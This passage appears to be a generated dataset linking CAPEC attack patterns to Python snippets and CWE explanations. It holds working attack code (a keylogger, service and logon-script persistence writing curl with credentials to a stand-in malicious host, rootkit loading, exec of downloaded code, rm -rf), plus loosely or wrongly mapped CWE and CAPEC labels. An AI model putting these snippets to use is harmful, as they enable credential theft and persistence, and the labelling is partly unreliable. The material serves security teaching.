        "code_snippet": "class DeviceComponent:\n    def __init__(self, data):\n        self.data = data\n\n    def destroy(self):\n        # CWE-1082: Self-destruction of the instance\n        del self\n\n    def remove_data(self):\n        # CWE-1301: Incomplete data removal\n        self.data = None\n\n    def __del__(self):\n        # CWE-1087: Destructor without being virtual\n        print('DeviceComponent destroyed')\n\n# Simulating physical destruction\ncomponent = DeviceComponent('sensitive information')\ncomponent.remove_data()  # Incomplete data removal\ncomponent.destroy()  # Self-destruction\n\n# CWE-1300: No protection against physical side channels\n# CWE-1334: No redundancy protection\n# These are not directly represented in the code but are implied vulnerabilities",
        "description": "This Python code snippet represents a simplified model of a device component that can be physically destroyed, embodying the main idea of the CAPEC 'Physical Destruction of Device or Component'. The class `DeviceComponent` includes methods that demonstrate several related CWEs:\n\n1. **CWE-1082**: The `destroy` method allows the instance to delete itself, representing a self-destruction control element.\n2. **CWE-1301**: The `remove_data` method attempts to remove data but does so incompletely by setting it to `None`, which may not fully erase sensitive information.\n3. **CWE-1087**: The class has a destructor (`__del__` method) that is not virtual, which can lead to undefined behavior in derived classes.\n\nThe code also implies vulnerabilities related to CWE-1300 (improper protection of physical side channels) and CWE-1334 (unauthorized error injection degrading hardware redundancy), although these are not directly represented in the code. The snippet demonstrates how an adversary could exploit these weaknesses to physically destroy or degrade the functionality of a device component."
    },
    {
        "capec_id": "548",
        "capec_name": "Contaminate Resource",
        "code_snippet": "import socket\n\n# CWE-319: Cleartext Transmission of Sensitive Information\n# CWE-922: Insecure Storage of Sensitive Information\n# CWE-402: Transmission of Private Resources into a New Sphere ('Resource Leak')\n\n# Sensitive information\nsensitive_data = 'UserPassword123'\n\n# Insecure storage of sensitive information\nwith open('sensitive_info.txt', 'w') as file:\n    file.write(sensitive_data)\n\n# Cleartext transmission of sensitive information\ndef send_data(data):\n    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    s.connect(('example.com', 80))\n    s.sendall(data.encode('utf-8'))\n    s.close()\n\n# Transmitting sensitive data\nsend_data(sensitive_data)\n\n# CWE-212: Improper Removal of Sensitive Information Before Storage or Transfer\n# CWE-226: Sensitive Information in Resource Not Removed Before Reuse\n# Reusing the file without clearing sensitive information\nwith open('sensitive_info.txt', 'r') as file:\n    reused_data = file.read()\n\nprint('Reused Data:', reused_data)",
        "description": "This Python code snippet demonstrates several security vulnerabilities related to the CAPEC 'Contaminate Resource'. The code stores sensitive information (a password) in a file without proper access control (CWE-922). It then transmits this sensitive information over a network in cleartext (CWE-319), making it susceptible to interception by unauthorized actors. Additionally, the code reuses the file containing sensitive information without clearing it first (CWE-226), and it does not properly remove sensitive information before making the resource available for reuse (CWE-212). This can lead to contamination of the resource, as unauthorized parties may gain access to sensitive information, causing the system to be brought offline for investigation and mitigation, thus denying availability."
    },
    {
        "capec_id": "549",
        "capec_name": "Local Execution of Code",
        "code_snippet": "import requests\nimport os\n\n# CWE-494: Download of Code Without Integrity Check\nurl = 'http://example.com/malicious_script.py'\nresponse = requests.get(url)\n\n# CWE-829: Inclusion of Functionality from Untrusted Control Sphere\nexec(response.text)\n\n# CWE-506: Embedded Malicious Code\n# Malicious code embedded in the downloaded script\n# Example of what could be in malicious_script.py:\n# os.system('rm -rf /')",
        "description": "This Python code snippet demonstrates a scenario where malicious code is downloaded and executed on a local system, embodying the main idea of CAPEC 'Local Execution of Code'. The code downloads a script from an untrusted source (CWE-494) and executes it without verifying its integrity (CWE-829). The downloaded script could contain embedded malicious code (CWE-506), such as a command to delete all files on the system. This example highlights the risks associated with executing code from untrusted sources and the potential for severe negative impacts."
    },
    {
        "capec_id": "550",
        "capec_name": "Install New Service",
        "code_snippet": "import os\nimport winreg\n\n# Vulnerable code: Install a new service with improper access control and default credentials\nservice_name = 'MyService'\nservice_executable = 'C:\\\\path\\\\to\\\\malicious.exe'\n\n# Open the registry key where services are registered\nkey = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r'SYSTEM\\CurrentControlSet\\Services', 0, winreg.KEY_SET_VALUE)\n\n# Create a new service entry\nnew_service_key = winreg.CreateKey(key, service_name)\nwinreg.SetValueEx(new_service_key, 'ImagePath', 0, winreg.REG_SZ, service_executable)\nwinreg.SetValueEx(new_service_key, 'Start', 0, winreg.REG_DWORD, 2)  # 2 means auto-start\nwinreg.SetValueEx(new_service_key, 'ObjectName', 0, winreg.REG_SZ, 'LocalSystem')  # Run with elevated privileges\n\n# Close the registry keys\nwinreg.CloseKey(new_service_key)\nwinreg.CloseKey(key)\n\nprint(f'Service {service_name} installed and set to run at startup.')",
        "description": "This Python code snippet demonstrates how an adversary might install a new service on a Windows system by modifying the registry. The service is set to run at startup with elevated privileges. The code embodies the CAPEC 'Install New Service' by creating a new service entry in the Windows registry. It also touches on related CWEs: 'Improper Access Control' (CWE-284) by not restricting access to the registry, 'Use of Default Credentials' (CWE-1392) by running the service as 'LocalSystem', and 'Initialization of a Resource with an Insecure Default' (CWE-1188) by setting the service to auto-start. This code is vulnerable and should not be used in production environments."
    },
    {
        "capec_id": "551",
        "capec_name": "Modify Existing Service",
        "code_snippet": "import os\nimport subprocess\n\n# CWE-284: Improper Access Control\n# CWE-15: External Control of System or Configuration Setting\n# CWE-522: Insufficiently Protected Credentials\n\n# Function to modify an existing service\n# This function demonstrates improper access control and external control of system settings\n# by allowing any user to modify a critical system service.\ndef modify_service(service_name, new_command):\n    try:\n        # Check if the service exists\n        service_status = subprocess.check_output(['systemctl', 'status', service_name], stderr=subprocess.STDOUT)\n        if b'could not be found' in service_status:\n            print(f\"Service {service_name} does not exist.\")\n            return\n\n        # CWE-522: Insufficiently Protected Credentials\n        # Storing credentials in plain text (for demonstration purposes)\n        admin_password = 'admin123'  # Insecure storage of credentials\n\n        # CWE-15: External Control of System or Configuration Setting\n        # Modifying the service configuration\n        os.system(f'echo {admin_password} | sudo -S systemctl stop {service_name}')\n        os.system(f'echo {admin_password} | sudo -S systemctl disable {service_name}')\n        os.system(f'echo {admin_password} | sudo -S systemctl edit {service_name}')\n        os.system(f'echo {admin_password} | sudo -S systemctl set-property {service_name} ExecStart={new_command}')\n        os.system(f'echo {admin_password} | sudo -S systemctl enable {service_name}')\n        os.system(f'echo {admin_password} | sudo -S systemctl start {service_name}')\n\n        print(f\"Service {service_name} has been modified to run {new_command}.\")\n    except subprocess.CalledProcessError as e:\n        print(f\"Failed to modify service {service_name}: {e}\")\n\n# Example usage\nmodify_service('example.service', '/usr/bin/new_command')",
        "description": "This Python code snippet demonstrates the concept of 'Modify Existing Service' by allowing a user to modify a system service. The function `modify_service` takes a service name and a new command to run as arguments. It checks if the service exists and then uses the `systemctl` command to stop, disable, edit, set a new command, enable, and start the service. The code embodies several vulnerabilities: CWE-284 (Improper Access Control) by not restricting who can modify the service, CWE-15 (External Control of System or Configuration Setting) by allowing external input to control system settings, and CWE-522 (Insufficiently Protected Credentials) by storing and using admin credentials in plain text. This code is a simplified example to illustrate the potential risks associated with modifying existing services without proper security measures."
    },
    {
        "capec_id": "552",
        "capec_name": "Install Rootkit ",
        "code_snippet": "import os\nimport ctypes\n\n# CWE-284: Improper Access Control\n# CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\n# CWE-78: OS Command Injection\n# CWE-506: Embedded Malicious Code\n# CWE-507: Trojan Horse\n\ndef install_rootkit():\n    # Simulate improper access control by running as an unauthorized user\n    if os.geteuid() != 0:\n        print(\"Root privileges required.\")\n        return\n\n    # Simulate exposure of sensitive system information\n    sensitive_info = os.popen('uname -a').read()\n    print(f\"Sensitive System Info: {sensitive_info}\")\n\n    # Simulate OS command injection vulnerability\n    malicious_command = \"echo 'malicious code' > /tmp/malicious_file\"\n    os.system(malicious_command)\n\n    # Simulate embedded malicious code\n    rootkit_code = \"\"\"\n    #include <stdio.h>\n    #include <stdlib.h>\n    void __attribute__((constructor)) init() {\n        system(\"echo 'Rootkit installed' > /tmp/rootkit_log\");\n    }\n    \"\"\"\n    with open('/tmp/rootkit.c', 'w') as f:\n        f.write(rootkit_code)\n\n    # Compile and load the rootkit (simulated)\n    os.system('gcc -shared -o /tmp/rootkit.so /tmp/rootkit.c')\n    ctypes.CDLL('/tmp/rootkit.so')\n\ninstall_rootkit()",
        "description": "This Python code snippet demonstrates the installation of a rootkit by exploiting several common vulnerabilities. The function `install_rootkit` first checks for root privileges (CWE-284: Improper Access Control). It then retrieves and prints sensitive system information (CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere). Next, it executes a malicious command (CWE-78: OS Command Injection). The code also writes and compiles a piece of malicious C code (CWE-506: Embedded Malicious Code) that simulates a rootkit, which is then loaded into the system (CWE-507: Trojan Horse). This snippet embodies the main idea of the CAPEC by demonstrating how an adversary can exploit these weaknesses to install a rootkit that alters system functionality and hides its presence."
    },
    {
        "capec_id": "554",
        "capec_name": "Functionality Bypass",
        "code_snippet": "import os\n\n# Simulated server-side function\ndef check_admin_privileges(user):\n    # Improper protection of alternate path (CWE-424)\n    if user == 'admin':\n        return True\n    return False\n\n# Client-side enforcement of server-side security (CWE-602)\n# This should be done on the server-side, not client-side\nuser = input('Enter your username: ')\nif check_admin_privileges(user):\n    # Use of low-level functionality (CWE-695)\n    os.system('rm -rf /important_data')  # Dangerous operation\n    print('Admin privileges granted. Important data deleted.')\nelse:\n    print('Access denied.')\n",
        "description": "This Python code snippet demonstrates a functionality bypass vulnerability. The `check_admin_privileges` function improperly protects an alternate path (CWE-424) by only checking if the username is 'admin'. The client-side enforcement of server-side security (CWE-602) is shown by relying on user input to determine access privileges, which should be handled server-side. Additionally, the use of low-level functionality (CWE-695) is illustrated by the dangerous `os.system('rm -rf /important_data')` command, which can be exploited if an attacker gains admin privileges. This code represents the main idea of the CAPEC by showing how an adversary can bypass intended protections and perform harmful actions."
    },
    {
        "capec_id": "555",
        "capec_name": "Remote Services with Stolen Credentials",
        "code_snippet": "import paramiko\n\n# Weak password requirements\nusername = 'admin'\npassword = 'password123'  # CWE-521: Weak Password Requirements\n\n# Single-factor authentication\nclient = paramiko.SSHClient()\nclient.set_missing_host_key_policy(paramiko.AutoAddPolicy())\n\ntry:\n    # Insufficiently protected credentials\n    client.connect('192.168.1.100', username=username, password=password)  # CWE-522: Insufficiently Protected Credentials\n    stdin, stdout, stderr = client.exec_command('ls')\n    print(stdout.read().decode())\nexcept paramiko.AuthenticationException:\n    print('Authentication failed.')\nfinally:\n    client.close()",
        "description": "This Python code snippet demonstrates a scenario where an attacker could use stolen credentials to access a remote service via SSH. The code uses the Paramiko library to establish an SSH connection with a server. The username and password are hardcoded and weak (CWE-521), and the authentication method is single-factor (CWE-308). The credentials are transmitted in an insecure manner (CWE-522). This setup embodies the CAPEC 'Remote Services with Stolen Credentials' by showing how an attacker could leverage weak and insufficiently protected credentials to gain unauthorized access to a system."
    },
    {
        "capec_id": "556",
        "capec_name": "Replace File Extension Handlers",
        "code_snippet": "import os\nimport winreg\n\n# Vulnerable function to replace file extension handler\n# This function modifies the registry to change the handler for .txt files\n# CWE-284: Improper Access Control\n# CWE-73: External Control of File Name or Path\n# CWE-646: Reliance on File Name or Extension of Externally-Supplied File\n# CWE-64: Windows Shortcut Following (.LNK)\ndef replace_file_handler(extension, new_handler):\n    try:\n        # Open the registry key where file handlers are stored\n        reg_path = f'Software\\\\Classes\\\\{extension}\\\\shell\\\\open\\\\command'\n        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_path, 0, winreg.KEY_SET_VALUE) as key:\n            # Set the new handler for the file extension\n            winreg.SetValueEx(key, '', 0, winreg.REG_SZ, new_handler)\n            print(f'Successfully changed handler for {extension} to {new_handler}')\n    except Exception as e:\n        print(f'Failed to change handler: {e}')\n\n# Example usage\nreplace_file_handler('.txt', 'C:\\\\malicious_program.exe %1')",
        "description": "This Python code snippet demonstrates a vulnerable function that replaces the file handler for a given file extension by modifying the Windows registry. The function `replace_file_handler` takes an extension and a new handler as arguments and sets the new handler in the registry. This embodies the CAPEC 'Replace File Extension Handlers' by allowing an arbitrary program to be called when a file with the specified extension is opened. The code is vulnerable to several CWEs: CWE-284 (Improper Access Control) because it does not restrict who can modify the registry, CWE-73 (External Control of File Name or Path) because it allows user input to control the file path, CWE-646 (Reliance on File Name or Extension of Externally-Supplied File) because it relies on the file extension to determine behavior, and CWE-64 (Windows Shortcut Following) because it does not handle .LNK files properly."
    },
    {
        "capec_id": "557",
        "capec_name": "DEPRECATED: Schedule Software To Run",
        "code_snippet": "import os\nimport time\n\n# Using an obsolete function to schedule a task\n# This is a vulnerable code example\n\ndef schedule_task():\n    # Obsolete function usage (CWE-477)\n    os.system('at 12:00 /every:M,T,W,Th,F,S,Su mytask.bat')\n\n# Simulate a task that relies on a runtime component (CWE-1101)\ndef mytask():\n    print('Task is running...')\n    # Simulate reliance on a runtime component\n    time.sleep(2)\n    print('Task completed.')\n\nif __name__ == '__main__':\n    schedule_task()\n    mytask()",
        "description": "This Python code snippet demonstrates the deprecated CAPEC concept of scheduling software to run, using related CWEs for context. The `schedule_task` function uses the obsolete `os.system` function to schedule a task, which is a representation of CWE-477 (Use of Obsolete Function). The `mytask` function simulates a task that relies on a runtime component, representing CWE-1101 (Reliance on Runtime Component in Generated Code). This code is vulnerable because it uses outdated methods for task scheduling and relies on runtime components that may not be secure or maintained."
    },
    {
        "capec_id": "558",
        "capec_name": "Replace Trusted Executable",
        "code_snippet": "import os\nimport shutil\n\n# CWE-284: Improper Access Control\n# Assume the script has elevated privileges\ntrusted_executable_path = '/usr/bin/trusted_executable'\nmalicious_executable_path = '/tmp/malicious_executable'\n\n# CWE-78: OS Command Injection\n# CWE-114: Process Control\n# Replace the trusted executable with a malicious one\ntry:\n    if os.path.exists(trusted_executable_path):\n        shutil.copy(malicious_executable_path, trusted_executable_path)\n        os.chmod(trusted_executable_path, 0o755)  # Ensure the malicious executable is executable\n        print('Trusted executable replaced with malicious executable.')\n    else:\n        print('Trusted executable not found.')\nexcept Exception as e:\n    print(f'Error: {e}')",
        "description": "This Python code snippet demonstrates a scenario where an attacker exploits improper access control (CWE-284) to replace a trusted executable with a malicious one. The script assumes it has elevated privileges, allowing it to overwrite the trusted executable located at '/usr/bin/trusted_executable' with a malicious version from '/tmp/malicious_executable'. The code also ensures the malicious executable has the correct permissions to be executed (CWE-78 and CWE-114). This represents the main idea of the CAPEC 'Replace Trusted Executable', where an adversary replaces a trusted executable to execute malware."
    },
    {
        "capec_id": "559",
        "capec_name": "Orbital Jamming",
        "code_snippet": "import socket\n\n# Simulate a rogue uplink station sending disruptive signals\nclass RogueUplinkStation:\n    def __init__(self, target_ip, target_port):\n        self.target_ip = target_ip\n        self.target_port = target_port\n\n    def send_disruptive_signal(self, message):\n        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:\n            s.sendto(message.encode(), (self.target_ip, self.target_port))\n\n# Target satellite's communication endpoint\nclass SatelliteCommunication:\n    def __init__(self, port):\n        self.port = port\n        self.socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n        self.socket.bind(('0.0.0.0', self.port))\n\n    def receive_message(self):\n        data, addr = self.socket.recvfrom(1024)\n        # CWE-940: Improper Verification of Source of a Communication Channel\n        print(f'Received message from {addr}: {data.decode()}')\n        # CWE-924: Improper Enforcement of Message Integrity During Transmission\n        if not self.verify_message_integrity(data):\n            print('Warning: Message integrity check failed!')\n\n    def verify_message_integrity(self, data):\n        # Placeholder for actual integrity check logic\n        return True\n\n# Example usage\nif __name__ == '__main__':\n    satellite = SatelliteCommunication(port=12345)\n    rogue_station = RogueUplinkStation(target_ip='127.0.0.1', target_port=12345)\n    \n    # Rogue station sends a disruptive signal\n    rogue_station.send_disruptive_signal('Disruptive Signal')\n    \n    # Satellite receives the message\n    satellite.receive_message()",
        "description": "This Python code snippet simulates an orbital jamming attack where a rogue uplink station sends disruptive signals to a target satellite. The `RogueUplinkStation` class represents the adversary, and the `SatelliteCommunication` class represents the satellite's communication endpoint. The satellite receives messages but does not properly verify the source (CWE-940) or enforce message integrity (CWE-924), making it vulnerable to jamming attacks. The code demonstrates how an attacker can disrupt satellite communications by exploiting these weaknesses."
    },
    {
        "capec_id": "560",
        "capec_name": "Use of Known Domain Credentials",
        "code_snippet": "import hashlib\nimport time\n\n# Simulate a database of user credentials\nuser_db = {\n    'user1': hashlib.sha256('password123'.encode()).hexdigest(),\n    'user2': hashlib.sha256('mypassword'.encode()).hexdigest()\n}\n\n# Function to authenticate user\nfailed_attempts = {}\n\ndef authenticate(username, password):\n    global failed_attempts\n    if username in failed_attempts and failed_attempts[username] >= 5:\n        print('Account locked due to too many failed attempts.')\n        return False\n    hashed_password = hashlib.sha256(password.encode()).hexdigest()\n    if username in user_db and user_db[username] == hashed_password:\n        print('Authentication successful')\n        failed_attempts[username] = 0  # Reset failed attempts on success\n        return True\n    else:\n        print('Authentication failed')\n        if username not in failed_attempts:\n            failed_attempts[username] = 0\n        failed_attempts[username] += 1\n        return False\n\n# Example usage\nprint(authenticate('user1', 'password123'))  # Should succeed\nprint(authenticate('user1', 'wrongpassword'))  # Should fail\nprint(authenticate('user1', 'wrongpassword'))  # Should fail\nprint(authenticate('user1', 'wrongpassword'))  # Should fail\nprint(authenticate('user1', 'wrongpassword'))  # Should fail\nprint(authenticate('user1', 'wrongpassword'))  # Should lock account\nprint(authenticate('user1', 'password123'))  # Should still be locked",
        "description": "This Python code snippet demonstrates a simple authentication system that embodies the main idea of CAPEC-Use of Known Domain Credentials. It includes a user database with hashed passwords and an authentication function. The function checks for excessive failed attempts (CWE-307) and locks the account after 5 failed attempts. The code uses single-factor authentication (CWE-308) and relies on password-based authentication (CWE-309). The hashed passwords are stored in the database, but the code does not implement secure storage or transmission methods (CWE-522). This example highlights the vulnerabilities associated with using known domain credentials and the related weaknesses."
    },
    {
        "capec_id": "561",
        "capec_name": "Windows Admin Shares with Stolen Credentials",
        "code_snippet": "import os\nimport getpass\nimport smbclient\n\n# CWE-521: Weak Password Requirements\nusername = input('Enter admin username: ')\npassword = getpass.getpass('Enter admin password: ')\n\n# CWE-308: Use of Single-factor Authentication\n# CWE-309: Use of Password System for Primary Authentication\ntry:\n    smbclient.register_session('server_name', username=username, password=password)\n    print('Authentication successful')\n    # Accessing Windows Admin Share\n    files = smbclient.listdir('\\\\server_name\\C$')\n    for file in files:\n        print(file)\nexcept smbclient.SMBAuthenticationError:\n    print('Authentication failed')\n\n# CWE-522: Insufficiently Protected Credentials\n# Storing credentials in an insecure manner\nwith open('credentials.txt', 'w') as cred_file:\n    cred_file.write(f'{username}:{password}')",
        "description": "This Python code snippet demonstrates a scenario where an adversary could exploit weak security practices to access Windows Admin Shares using stolen or guessed credentials. The code prompts the user for an admin username and password, which are then used to authenticate and access a Windows Admin Share. The credentials are stored insecurely in a text file, highlighting CWE-522. The use of single-factor authentication (CWE-308) and password-based primary authentication (CWE-309) are also shown, which are susceptible to various attacks. This example embodies the main idea of the CAPEC by illustrating how weak credential management and authentication practices can be exploited."
    },
    {
        "capec_id": "562",
        "capec_name": "Modify Shared File",
        "code_snippet": "import os\nimport tempfile\n\n# CWE-378: Creation of Temporary File With Insecure Permissions\n# CWE-284: Improper Access Control\n# CWE-434: Unrestricted Upload of File with Dangerous Type\n# CWE-494: Download of Code Without Integrity Check\n\n# Create a temporary file in a shared directory with insecure permissions\ntemp_dir = '/tmp/shared'\nos.makedirs(temp_dir, exist_ok=True)\n\n# Insecurely create a temporary file\nwith tempfile.NamedTemporaryFile(dir=temp_dir, delete=False) as temp_file:\n    temp_file.write(b'Original content')\n    temp_file_path = temp_file.name\n\n# Simulate an adversary modifying the shared file\nwith open(temp_file_path, 'wb') as temp_file:\n    temp_file.write(b'Malicious content')\n\n# Simulate a user opening the shared file\nwith open(temp_file_path, 'rb') as temp_file:\n    content = temp_file.read()\n    print(content.decode())",
        "description": "This Python code snippet demonstrates a scenario where a temporary file is created in a shared directory with insecure permissions (CWE-378). The file is then modified by an adversary to include malicious content (CAPEC-27: Modify Shared File). The code also touches on improper access control (CWE-284) by not restricting access to the temporary file, allowing unauthorized modification. Finally, it simulates a user opening the shared file and executing the tainted content, representing the core idea of the CAPEC. The code is concise and highlights the vulnerabilities associated with shared file manipulation."
    },
    {
        "capec_id": "563",
        "capec_name": "Add Malicious File to Shared Webroot",
        "code_snippet": "import os\nfrom flask import Flask, request, send_from_directory\n\napp = Flask(__name__)\nUPLOAD_FOLDER = '/var/www/uploads'\napp.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER\n\n@app.route('/upload', methods=['POST'])\ndef upload_file():\n    if 'file' not in request.files:\n        return 'No file part', 400\n    file = request.files['file']\n    if file.filename == '':\n        return 'No selected file', 400\n    file.save(os.path.join(app.config['UPLOAD_FOLDER'], file.filename))\n    return 'File uploaded successfully', 200\n\n@app.route('/uploads/<filename>')\ndef uploaded_file(filename):\n    return send_from_directory(app.config['UPLOAD_FOLDER'], filename)\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet uses the Flask web framework to create a simple web application that allows users to upload files to a directory under the web root and then access those files via a URL. The '/upload' endpoint handles file uploads, saving them to the '/var/www/uploads' directory. The '/uploads/<filename>' endpoint serves the uploaded files. This code embodies the CAPEC 'Add Malicious File to Shared Webroot' by allowing an adversary to upload potentially malicious files to a web-accessible directory. The related CWEs are represented as follows: CWE-284 (Improper Access Control) is shown by the lack of access control on the upload and download endpoints, CWE-219 (Storage of File with Sensitive Data Under Web Root) is demonstrated by storing uploaded files in a web-accessible directory, CWE-433 (Unparsed Raw Web Content Delivery) is implied by serving files without parsing or validation, CWE-646 (Reliance on File Name or Extension of Externally-Supplied File) is shown by saving files based on their provided names, and CWE-494 (Download of Code Without Integrity Check) is represented by serving files without verifying their integrity."
    },
    {
        "capec_id": "564",
        "capec_name": "Run Software at Logon",
        "code_snippet": "import os\n\n# CWE-798: Use of Hard-coded Credentials\nADMIN_CREDENTIALS = {'username': 'admin', 'password': 'admin123'}\n\n# CWE-284: Improper Access Control\nlogon_script_path = '/etc/logon_script.sh'\n\n# Check if the script is accessible and writable\nif os.access(logon_script_path, os.W_OK):\n    with open(logon_script_path, 'a') as logon_script:\n        # CWE-259: Use of Hard-coded Password\n        logon_script.write('\\n# Malicious code to run at logon\\n')\n        logon_script.write('echo \"Malicious activity\"\\n')\n        logon_script.write('curl -u {username}:{password} http://malicious.example.com\\n'.format(\n            username=ADMIN_CREDENTIALS['username'],\n            password=ADMIN_CREDENTIALS['password']\n        ))\nelse:\n    print('Logon script is not writable')",
        "description": "This Python code snippet demonstrates a vulnerability where an attacker can modify a logon script to include malicious code. The script checks if the logon script is writable (CWE-284: Improper Access Control). If it is, the script appends malicious commands to the logon script, including a command that uses hard-coded credentials (CWE-798: Use of Hard-coded Credentials and CWE-259: Use of Hard-coded Password) to send data to a malicious server. This represents the CAPEC 'Run Software at Logon' by showing how an attacker can maintain persistence by modifying logon scripts."
    },
    {
        "capec_id": "565",
        "capec_name": "Password Spraying",
        "code_snippet": "import time\n\n# List of common passwords to try\ncommon_passwords = ['password123', '123456', 'qwerty', 'letmein', 'welcome']\n\n# List of user accounts\nuser_accounts = ['user1', 'user2', 'user3', 'user4', 'user5']\n\n# Simulated function to check password (always returns False for simplicity)\ndef check_password(username, password):\n    # In a real scenario, this would check the password against a stored hash\n    return False\n\n# Password spraying attack simulation\nfor password in common_passwords:\n    for user in user_accounts:\n        if check_password(user, password):\n            print(f\"Password for {user} is {password}\")\n        time.sleep(1)  # Sleep to avoid rapid lockout\n\nprint(\"Password spraying attack completed.\")",
        "description": "This Python code snippet simulates a Password Spraying attack. It iterates over a list of common passwords and attempts to authenticate each user account with each password. The `check_password` function is a placeholder that always returns False, representing a failed login attempt. The `time.sleep(1)` call introduces a delay between attempts to avoid rapid account lockouts, mimicking the behavior of an attacker trying to remain undetected. This code embodies the main idea of CAPEC-111 (Password Spraying) and highlights related weaknesses such as weak password requirements (CWE-521), improper restriction of excessive authentication attempts (CWE-307), and reliance on single-factor authentication (CWE-308)."
    },
    {
        "capec_id": "566",
        "capec_name": "DEPRECATED: Dump Password Hashes",
        "code_snippet": "import hashlib\n\n# Example of using a one-way hash without a salt\npassword = 'user_password'\nhash_object = hashlib.sha256(password.encode())\nhash_password = hash_object.hexdigest()\nprint(f'Hashed password: {hash_password}')",
        "description": "This Python code snippet demonstrates the use of a one-way hash (SHA-256) to hash a password without using a salt. This approach is vulnerable because it does not incorporate a salt, making it susceptible to precomputed hash attacks (rainbow tables). The code embodies the main idea of the deprecated CAPEC 'Dump Password Hashes' by showing a common mistake in handling password storage, which is related to CWE-759 (Use of a One-Way Hash without a Salt)."
    },
    {
        "capec_id": "567",
        "capec_name": "DEPRECATED: Obtain Data via Utilities",
        "code_snippet": "import os\nimport subprocess\n\n# Vulnerable code: Using obsolete function 'os.popen' to obtain data\n# CWE-477: Use of Obsolete Function\n# CWE-493: Critical data is not protected\n\n# This function uses os.popen, which is deprecated and insecure\n# It also fails to protect the confidentiality of the data obtained\n\ndef get_system_info():\n    # Using an obsolete function to execute a system command\n    result = os.popen('uname -a').read()\n    return result\n\n# Example usage\nsystem_info = get_system_info()\nprint(system_info)",
        "description": "This Python code snippet demonstrates the use of an obsolete function 'os.popen' to obtain system information, which is a deprecated and insecure method (CWE-477). The function 'get_system_info' executes a system command to retrieve system information but fails to protect the confidentiality of the data obtained (CWE-493). This embodies the main idea of the deprecated CAPEC 'Obtain Data via Utilities' by showing how using outdated and insecure methods can lead to vulnerabilities in the code."
    },
    {
        "capec_id": "568",
        "capec_name": "Capture Credentials via Keylogger",
        "code_snippet": "import pynput.keyboard as keyboard\nimport os\n\n# CWE-522: Insufficiently Protected Credentials\nlog_file = 'keylog.txt'\n\n# CWE-309: Use of Password System for Primary Authentication\n# CWE-521: Weak Password Requirements\n# CWE-798: Use of Hard-coded Credentials\n# CWE-294: Authentication Bypass by Capture-replay\nhardcoded_password = 'password123'\n\n# Function to write keystrokes to a log file\ndef on_press(key):\n    with open(log_file, 'a') as f:\n        try:\n            f.write(key.char)\n        except AttributeError:\n            f.write('[' + key.name + ']')\n\n# Start the keylogger\nwith keyboard.Listener(on_press=on_press) as listener:\n    listener.join()",
        "description": "This Python code snippet demonstrates a simple keylogger using the 'pynput' library to capture keystrokes and write them to a log file ('keylog.txt'). The keylogger captures all keystrokes made by the user, which can then be analyzed to extract credentials such as passwords. The code also includes a hardcoded password ('password123'), illustrating CWE-798 (Use of Hard-coded Credentials). The use of a log file to store captured keystrokes represents CWE-522 (Insufficiently Protected Credentials). The keylogger can capture weak passwords (CWE-521) and passwords used for primary authentication (CWE-309). This code snippet embodies the main idea of CAPEC-564 (Capture Credentials via Keylogger) by demonstrating how an adversary can deploy a keylogger to capture user credentials."
    },
    {
        "capec_id": "569",
        "capec_name": "Collect Data as Provided by Users",
        "code_snippet": "import os\nimport getpass\n\n# CWE-214: Invocation of Process Using Visible Sensitive Information\n# Collecting sensitive information from the user\nusername = input('Enter your username: ')\npassword = getpass.getpass('Enter your password: ')\n\n# CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n# Storing sensitive information in a file with improper permissions\nwith open('credentials.txt', 'w') as f:\n    f.write(f'Username: {username}\\n')\n    f.write(f'Password: {password}\\n')\n\n# CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\n# Executing a command that exposes sensitive information\nos.system(f'echo {password} | sudo -S ls')\n\n# CWE-69: Improper Handling of Windows ::DATA Alternate Data Stream\n# Using alternate data streams to hide sensitive information\nwith open('credentials.txt:hidden', 'w') as f:\n    f.write(f'Username: {username}\\n')\n    f.write(f'Password: {password}\\n')\n\n# CWE-520: .NET Misconfiguration: Use of Impersonation\n# This is a Python example, but similar misconfigurations can occur in .NET\n# Allowing the script to run with elevated privileges\nos.system('sudo python3 -c \"print(\\'Running with elevated privileges\\')\"')",
        "description": "This Python code snippet demonstrates several vulnerabilities related to the CAPEC 'Collect Data as Provided by Users'. The code collects sensitive information (username and password) from the user and stores it in a file with improper permissions, making it accessible to unauthorized actors (CWE-200). It also executes a command that exposes the password in a visible manner (CWE-214). Additionally, it uses alternate data streams to hide sensitive information (CWE-69) and runs a command with elevated privileges, which can be dangerous if misconfigured (CWE-520). The code embodies the main idea of the CAPEC by capturing and mishandling sensitive information provided by the user, potentially enabling follow-on attacks."
    },
    {
        "capec_id": "570",
        "capec_name": "DEPRECATED: Signature-Based Avoidance",
        "code_snippet": "import hashlib\nimport os\n\n# DEPRECATED: Use of MD5 for hashing (CWE-477)\ndef hash_password(password):\n    return hashlib.md5(password.encode()).hexdigest()\n\n# DEPRECATED: Unchecked error condition (CWE-391)\ndef read_file(file_path):\n    try:\n        with open(file_path, 'r') as file:\n            return file.read()\n    except Exception as e:\n        pass  # Error is ignored\n\n# DEPRECATED: Reliance on DNS Lookups in a Security Decision (CWE-247)\ndef check_dns(hostname):\n    import socket\n    try:\n        ip = socket.gethostbyname(hostname)\n        if ip == '127.0.0.1':\n            return True\n        else:\n            return False\n    except socket.error:\n        return False\n\n# Example usage\npassword = 'password123'\nhashed_password = hash_password(password)\nprint(f'Hashed Password: {hashed_password}')\n\nfile_content = read_file('example.txt')\nprint(f'File Content: {file_content}')\n\nis_localhost = check_dns('localhost')\nprint(f'Is Localhost: {is_localhost}')",
        "description": "This Python code snippet demonstrates several deprecated practices and vulnerabilities as described in the CAPEC and related CWEs. The `hash_password` function uses the deprecated MD5 hashing algorithm (CWE-477), which is considered insecure. The `read_file` function ignores exceptions (CWE-391), potentially allowing errors to go unnoticed and unhandled. The `check_dns` function relies on DNS lookups to make a security decision (CWE-247), which can be unreliable and insecure. These examples highlight the importance of using up-to-date, secure practices and properly handling errors in code."
    },
    {
        "capec_id": "571",
        "capec_name": "Block Logging to Central Repository",
